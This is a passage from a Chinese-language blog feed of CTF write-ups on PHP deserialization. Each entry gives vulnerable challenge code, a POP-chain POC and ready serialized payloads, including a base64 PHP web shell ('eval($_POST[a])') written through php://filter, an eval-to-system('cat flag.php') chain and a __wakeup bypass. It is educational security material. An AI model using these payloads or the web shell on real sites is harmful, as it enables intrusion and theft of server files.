language_">$this</span>-&gt;key = <span class="string">&#x27;/../c.php/.&#x27;</span>;</span><br><span class="line">      <span class="comment">#随意的数值，这里似乎没啥用</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;expire = <span class="number">111</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="comment">#动态生成成员</span></span><br><span class="line"><span class="comment">#用于触发save方法</span></span><br><span class="line"><span class="variable">$a</span>-&gt;autosave=<span class="literal">false</span>;</span><br><span class="line"><span class="comment">#处理之后得到contents，path是一个base64值</span></span><br><span class="line"><span class="comment">#&lt;?php eval($_POST[a]);?&gt;</span></span><br><span class="line"><span class="variable">$a</span>-&gt;cache = <span class="keyword">array</span>(<span class="string">&#x27;111&#x27;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;path&quot;</span>=&gt;<span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbYV0pOz8+&quot;</span>));</span><br><span class="line"><span class="comment">#这个并没有什么用，只是用来添加到json中，随便设</span></span><br><span class="line"><span class="variable">$a</span>-&gt;complete = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$options</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="comment">#禁止压缩</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">      <span class="comment">#随意的数值</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>] = <span class="number">111</span>;</span><br><span class="line">      <span class="comment">#serialize的方法</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>] = <span class="string">&#x27;strval&#x27;</span>;</span><br><span class="line">      <span class="comment">#用来确定写入文件的地址</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] = <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=uploads/&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将payload作为参数data的值传给题目页面后在用蚁剑访问&#x2F;uploads&#x2F;a.php即可拿到shell，并得到flag</p><p><strong><a href="https://www.cnblogs.com/kevinbruce656/p/12713474.html">https://www.cnblogs.com/kevinbruce656/p/12713474.html</a></strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serDemo5-buu-2020新春红包题&quot;&gt;&lt;a href=&quot;#serDemo5-buu-2020新春红包题&quot; class=&quot;headerlink&quot; title=&quot;serDemo5 buu 2020新春红包题&quot;&gt;&lt;/a&gt;serDemo5 buu 2020新春红</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>serDemo3</title>
    <link href="http://example.com/2023/12/22/serDemo3/"/>
    <id>http://example.com/2023/12/22/serDemo3/</id>
    <published>2023-12-22T13:43:23.000Z</published>
    <updated>2023-12-23T04:42:29.884Z</updated>
    
    <content type="html"><![CDATA[<h1 id="serDemo3"><a href="#serDemo3" class="headerlink" title="serDemo3"></a>serDemo3</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span> . <span class="variable language_">$this</span>-&gt;source . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Sonder&#x27;</span>])) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Sonder&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="POPC"><a href="#POPC" class="headerlink" title="POPC"></a>POPC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$show</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="comment">//echo serialize(new Show($show));</span></span><br><span class="line"><span class="comment">//O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;s:9:&quot;index.php&quot;;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot; * var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Show</span>(<span class="variable">$show</span>)));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>unserialize 找 <code>__wakeup()</code>、<code>__destruct()</code></p><p>在show类中有 <code>__wakeup()</code>方法,其中有$this-&gt;source,当$source为 Show 对象时会先执行<code>__construct()</code>,当执行<code>__toString()</code> 方法,其中 $source 和 $str都是可控的;</p><p><code>__toString()</code>方法指向$this-&gt;str-&gt;source;会发现没有source方法,但是在Test类中找到了<code>__get()</code>方法,其中$p可控,并且return $function();会触发<code>__invoke()</code>方法;</p><p>Modifier类中找到<code>__invoke()</code>方法,指向append方法,会执行include()就可以用php伪协议读文件;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A9%3A%22index.php%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serDemo3&quot;&gt;&lt;a href=&quot;#serDemo3&quot; class=&quot;headerlink&quot; title=&quot;serDemo3&quot;&gt;&lt;/a&gt;serDemo3&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td clas</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>serDemo2 pop链</title>
    <link href="http://example.com/2023/12/22/serDemo2/"/>
    <id>http://example.com/2023/12/22/serDemo2/</id>
    <published>2023-12-22T13:42:23.000Z</published>
    <updated>2023-12-23T04:42:29.845Z</updated>
    
    <content type="html"><![CDATA[<h1 id="serDemo2-pop链"><a href="#serDemo2-pop链" class="headerlink" title="serDemo2 pop链"></a>serDemo2 pop链</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;varr = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;varr))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;文件&quot;</span> . <span class="variable language_">$this</span>-&gt;varr . <span class="string">&quot;存在&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;varr = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;varr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;这是f2的析构函数&lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;varr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;这是f3的析构函数&lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Sonder&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Sonder&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;varr = <span class="keyword">new</span> <span class="title function_ invoke__">test2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;varr = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title function_ invoke__">test3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// public $varr=&quot;system(&#x27;ls&#x27;);&quot;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>=<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$T1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test1</span>();</span><br><span class="line"><span class="comment">//var_dump($T1);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$T1</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A5%3A%22test1%22%3A1%3A%7Bs%3A4%3A%22varr%22%3BO%3A5%3A%22test2%22%3A2%3A%7Bs%3A4%3A%22varr%22%3Bs%3A6%3A%22123456%22%3Bs%3A3%3A%22obj%22%3BO%3A5%3A%22test3%22%3A1%3A%7Bs%3A4%3A%22varr%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D%7D</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><ol><li>看到<code>unserialize</code> 找 <code>__wakeup()</code>、<code>__destruct()</code>;而在test1类中有 <code>__destruct()</code> 方法，其中会先判断file_exists();</li><li>如果file_exists()的值为对象时，会执行<code>__toString()</code>方法，并且$varr 是可控的，搜索<code>__toString()</code>方法 在 test2 中有<code>__toString()</code>方法;</li><li>其中又指向<code>$this-&gt;obj-&gt;execute()</code>查找execute()方法,并且<code>$varr</code>和<code>$obj</code>;是可控的查找execute()方法,参数直接执行eval(),在 test3中有execute()方法,并且<code>$varr</code>是可控的.</li><li><code>unserialize -&gt; file_exists() [test1] -&gt; __destruct() [test1] -&gt; toString [test2] -&gt; $this-&gt;obj-&gt;execute() [test3]</code></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serDemo2-pop链&quot;&gt;&lt;a href=&quot;#serDemo2-pop链&quot; class=&quot;headerlink&quot; title=&quot;serDemo2 pop链&quot;&gt;&lt;/a&gt;serDemo2 pop链&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>serDemo1</title>
    <link href="http://example.com/2023/12/22/serDemo1/"/>
    <id>http://example.com/2023/12/22/serDemo1/</id>
    <published>2023-12-22T13:41:23.000Z</published>
    <updated>2023-12-23T04:42:29.807Z</updated>
    
    <content type="html"><![CDATA[<h1 id="serDemo1"><a href="#serDemo1" class="headerlink" title="serDemo1"></a>serDemo1</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">//关闭错误报告</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">happy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strchr</span>(<span class="variable">$this</span>-&gt;file, <span class="string">&quot;\\&quot;</span>) === <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">strchr</span>(<span class="variable">$this</span>-&gt;file, <span class="string">&#x27;/&#x27;</span>) === <span class="literal">false</span>) <span class="comment">//过滤了文件名中的\\与/</span></span><br><span class="line">                <span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$this</span>-&gt;file); <span class="comment">//打开文件操作</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Wrong filename.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Sonder&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Sonder&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// password in flag.php</span></span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">happy</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$file</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Happy</span> = <span class="keyword">new</span> <span class="title function_ invoke__">happy</span>();</span><br><span class="line"><span class="comment">//echo serialize($Happy);</span></span><br><span class="line"><span class="comment">//O:5:&quot;happy&quot;:1:&#123;s:7:&quot;\00*\00file&quot;;s:8:&quot;flag.php&quot;;&#125;  \00为空字符</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&#x27;O:5:&quot;happy&quot;:2:&#123;s:7:&quot;&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>unserialize 先找找看有无 <code>__wakeup()</code> 、<code>__destruct()</code> </p><p>在happy类中有 <code>__destruct()</code> 方法 并且如果<code>$file</code>存在的话直接展示<code>$file</code>的代码</p><p>但是注意到happy类中还有 <code>__wakeup()</code> 方法 将<code>$file</code>的值改变</p><p>在unserialize执行<code>__destruct()</code>要先执行<code>__wakeup()</code>因此要想办法绕过<code>__wakeup()</code></p><h1 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h1><p><strong>protected</strong>属性在序列化过后参数前面的标识符为<code>\00*\00</code> (<code>\00</code>为空字符) 但是用<code>\00</code>的时候不能成功输出 以因此使用<code>chr(0)</code>来拼接代替</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tzo1OiJoYXBweSI6Mjp7czo3OiIAKgBmaWxlIjtzOjg6ImZsYWcucGhwIjt9</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serDemo1&quot;&gt;&lt;a href=&quot;#serDemo1&quot; class=&quot;headerlink&quot; title=&quot;serDemo1&quot;&gt;&lt;/a&gt;serDemo1&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td clas</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>serVuln13 引用和session</title>
    <link href="http://example.com/2023/12/22/serVuln13/"/>
    <id>http://example.com/2023/12/22/serVuln13/</id>
    <published>2023-12-22T13:33:23.000Z</published>
    <updated>2023-12-23T04:42:30.082Z</updated>
    
    <content type="html"><![CDATA[<h1 id="serVuln13-引用和session"><a href="#serVuln13-引用和session" class="headerlink" title="serVuln13 引用和session"></a>serVuln13 引用和session</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*hint.php*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$her</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable language_">$this</span>-&gt;her = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name === <span class="variable language_">$this</span>-&gt;her) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span 